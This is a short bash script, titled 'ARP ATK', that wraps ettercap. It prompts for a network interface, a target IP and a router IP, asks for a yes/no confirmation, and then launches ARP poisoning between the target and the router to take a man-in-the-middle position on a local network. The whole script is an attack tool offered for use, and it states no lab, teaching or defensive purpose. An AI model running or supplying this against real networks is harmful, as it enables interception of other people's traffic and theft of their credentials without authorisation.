#!/bin/bash

clear;figlet "ARP ATK"

sleep 1

read -p "enter and interface (like wlan0) > " inface
echo ""
read -p "enter an the first ip (div target) > " ip
echo ""
read -p "enter the router to posion > " route
echo ""

read -p "do you want to run this command? (y or n) > " yorn

if [[ "$yorn" == "Y" ]]; then
        echo "ALREADY"
        sleep 0.1
        clear
elif [[ "$yorn" == "y" ]]; then
        echo "ALREADY"
        sleep 0.1
        clear
elif [[ "$yorn" == "N" ]]; then
        echo "BYE $USER"
        sleep 0.1
        clear
        exit
elif [[ "$yorn" == "n" ]]; then
        echo "BYE $USER"
        sleep 0.1
        clear
        exit
else
        echo "enter y or n"
        exit
fi

sudo ettercap -T -S -i $inface -M arp:remote /$ip// /$route//
